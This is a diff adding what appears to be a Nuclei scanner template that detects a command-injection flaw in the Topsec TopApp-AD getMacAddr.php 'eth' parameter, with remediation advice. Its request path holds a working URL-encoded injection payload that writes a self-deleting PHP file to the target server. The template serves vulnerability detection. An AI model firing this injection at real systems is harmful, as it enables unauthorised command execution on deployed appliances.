@@ -1,0 +1,31 @@
+id: TopApp-AD_getMacAddr_php-RCE
+info:
+  name: Topsec TopApp-AD getMacAddr.php eth parameter command execution
+  author:
+  - l0ne1y
+  description: |-
+    Topsec TopApp-AD getMacAddr.php command execution vulnerability
+    Topsec TopApp-AD application delivery system is the application delivery device with the most complete functionality in the industry.
+
+    Topsec TopApp-AD has a command execution vulnerability. Attackers can exploit it to execute arbitrary system commands.
+  severity: critical
+  remediation: |-
+    Official remedy:
+    1. It is recommended that users obtain the latest patch or the latest version program from the official website:
+    https://www.topsec.com.cn/
+
+    Temporary remedy:
+    1. Try not to execute external applications or commands.
+    2. Use custom functions or function libraries to implement the functionality of external applications or commands.
+    3. Before executing functions with command execution functionality such as system and eval, validate the parameter content.
+    4. Use the escapeshellarg function to process related parameters. The escapeshellarg function escapes any character that could end a parameter or a command; for example, single quotes are escaped, double quotes are escaped, and semicolons are escaped. This confines the parameter content within a pair of single or double quotes, escaping the single or double quotes contained in the parameter so they cannot truncate the current execution, thereby preventing command injection attacks.
+    5. Use safe_mode_exec_dir to specify the executable file path. Set safe_mode in the php.ini file to On, place the allowed executable files into a directory, and use safe_mode_exec_dir to specify this executable path. When an external program needs to be executed, it will only be allowed to run if it resides in the directory specified by safe_mode_exec_dir; otherwise execution will fail.
+requests:
+- matchers:
+  - type: dsl
+    dsl:
+    - status_code_2==200 && contains(body_2,"c4ca4238a0b923820dcc509a6f75849b")
+  path:
+  - '{{BaseURL}}/acc/network/getMacAddr.php?eth=%20%7C%20echo%20%27%3C%3Fphp%20echo%20md5%281%29%3Bunlink%28__FILE__%29%3B%3F%3E%27%20%3E%20{{randstr}}.php%20%7C%20'
+  - '{{BaseURL}}/{{randstr}}.php'
+  method: GET
